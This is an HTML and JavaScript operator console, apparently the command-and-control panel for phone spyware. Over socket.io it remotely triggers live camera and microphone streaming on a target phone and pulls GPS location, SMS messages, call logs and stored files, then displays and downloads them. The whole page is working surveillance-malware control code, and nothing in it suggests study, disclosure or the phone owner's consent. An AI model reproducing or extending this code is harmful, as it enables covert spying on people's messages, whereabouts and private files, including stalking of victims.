<!DOCTYPE html>
<html>
<head>
    <title>Monitor Console v4</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; padding: 20px; }
        .card { background: #1e1e1e; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #333; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 15px; }
        .video-box { background: #000; width: 100%; height: 350px; border-radius: 8px; overflow: hidden; display: flex; align-items: center; justify-content: center; position: relative; }
        #live-frame { width: 100%; height: 100%; object-fit: contain; }
        select, button { padding: 10px; margin: 5px; border-radius: 5px; border: none; font-weight: bold; cursor: pointer; }
        .btn-green { background: #28a745; color: white; }
        .btn-red { background: #dc3545; color: white; }
        .log-screen { background: black; color: #0f0; padding: 10px; height: 180px; overflow-y: auto; font-family: monospace; font-size: 12px; }
    </style>
</head>
<body>

    <div class="grid">
        <div class="card" style="grid-column: span 2;">
            <div class="video-box">
                <img id="live-frame" style="display:none;">
                <p id="placeholder">Stream Offline</p>
            </div>
            <div style="display:flex; gap:5px; margin-top:10px;">
                <select id="cam-idx"><option value="0">Back Cam</option><option value="1">Front Cam</option></select>
                <select id="mode-idx"><option value="video">Only Video</option><option value="audio-video">Audio+Video</option></select>
                <button class="btn-green" onclick="startStream()">START</button>
                <button class="btn-red" onclick="sendCmd('stop-stream')">STOP</button>
            </div>
        </div>

        <div class="card">
            <h3>ğŸ“Š Status</h3>
            <p>GPS: <span id="loc">None</span></p>
            <button onclick="sendCmd('get-gps')">ğŸ“ Update GPS</button>
            <button onclick="sendCmd('get-sms')">ğŸ“© Fetch SMS</button>
            <button onclick="sendCmd('get-calls')">ğŸ“ Fetch Calls</button>
        </div>

        <div class="card">
            <h3>ğŸ“ File Manager</h3>
            <button onclick="sendCmd('get-files')">Scan Storage</button>
            <div id="file-list" class="log-screen" style="height: 120px; color: white;"></div>
        </div>

        <div class="card" style="grid-column: span 2;">
            <h3>ğŸ’¬ Logs</h3>
            <div id="data-log" class="log-screen"></div>
        </div>
    </div>

    <script>
        const socket = io();
        function sendCmd(c) { socket.emit('phone-execute', c); }

        function startStream() {
            const cam = document.getElementById('cam-idx').value;
            const mode = document.getElementById('mode-idx').value;
            sendCmd(`stream:${cam}:${mode}`);
        }

        socket.on('data-stream', (b) => {
            document.getElementById('placeholder').style.display = 'none';
            const img = document.getElementById('live-frame');
            img.style.display = 'block';
            img.src = "data:image/jpeg;base64," + b;
        });

        socket.on('audio-stream', (b) => {
            new Audio("data:audio/wav;base64," + b).play().catch(()=>{});
        });

        socket.on('location-update', (d) => {
            document.getElementById('loc').innerHTML = `<a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank">View Map</a>`;
        });

        socket.on('file-data', (data) => {
            const files = JSON.parse(data);
            let h = "";
            files.forEach(f => {
                h += `<div>${f.d?'ğŸ“':'ğŸ“„'} ${f.n} <button onclick="sendCmd('download:${f.n}')" style="padding:2px; font-size:10px;">DL</button></div>`;
            });
            document.getElementById('file-list').innerHTML = h;
        });

        socket.on('sms-data', (d) => {
            const logs = JSON.parse(d);
            let h = "<b>SMS:</b><br>";
            logs.forEach(m => h += `[${m.from}] ${m.body}<br>`);
            document.getElementById('data-log').innerHTML = h;
        });

        socket.on('file-download-ready', (f) => {
            const a = document.createElement('a');
            a.href = "data:application/octet-stream;base64," + f.data;
            a.download = f.name;
            a.click();
        });
    </script>
</body>
</html>
